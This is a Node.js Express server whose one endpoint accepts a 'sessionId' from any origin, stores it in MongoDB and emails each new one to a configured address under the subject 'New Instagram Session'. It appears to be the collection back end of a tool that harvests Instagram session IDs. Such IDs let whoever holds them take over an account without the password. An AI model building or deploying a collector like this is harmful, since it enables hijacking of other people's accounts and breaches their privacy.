require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const nodemailer = require('nodemailer');
const cors = require('cors');

const app = express();

// Middleware - MUST come before routes
app.use(cors());
app.use(express.json()); // This is the crucial line for body parsing

// MongoDB Connection
mongoose.connect(process.env.MONGODB_URI, {
  useNewUrlParser: true,
  useUnifiedTopology: true
})
.then(() => console.log('✅ MongoDB connected'))
.catch(err => console.error('❌ MongoDB connection error:', err));

// Session Model
const sessionSchema = new mongoose.Schema({
  sessionId: { type: String, unique: true },
  createdAt: { type: Date, default: Date.now }
});
const Session = mongoose.model('Session', sessionSchema);

// Email Transport
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS
  }
});

// API Endpoint - WITH PROPER ERROR HANDLING
app.post('/api/sessions', async (req, res) => {
  try {
    // Validate request body exists
    if (!req.body || typeof req.body !== 'object') {
      return res.status(400).json({ 
        success: false,
        error: 'Invalid request body' 
      });
    }

    // Destructure with fallback
    const { sessionId } = req.body || {};

    // Validate sessionId exists
    if (!sessionId) {
      return res.status(400).json({ 
        success: false,
        error: 'sessionId is required in request body' 
      });
    }

    // Try to create new session
    try {
      const newSession = await Session.create({ sessionId });

      // Send email for new sessions
      await transporter.sendMail({
        to: process.env.RECIPIENT_EMAIL,
        subject: 'New Instagram Session',
        text: `Session ID: ${sessionId}`,
        html: `<p>New session detected: <code>${sessionId}</code></p>`
      });

      return res.json({ 
        success: true,
        isNew: true,
        message: 'New session recorded'
      });

    } catch (dbError) {
      if (dbError.code === 11000) { // Duplicate key error
        return res.json({ 
          success: true,
          isNew: false,
          message: 'Session already exists'
        });
      }
      throw dbError;
    }

  } catch (error) {
    console.error('❌ Server error:', error);
    return res.status(500).json({ 
      success: false,
      error: 'Internal server error' 
    });
  }
});

// Health check endpoint
app.get('/', (req, res) => {
  res.json({ 
    status: 'Server is running',
    endpoints: {
      sessionTracking: 'POST /api/sessions'
    }
  });
});

// Handle 404
app.use((req, res) => {
  res.status(404).json({ 
    success: false,
    error: 'Endpoint not found' 
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});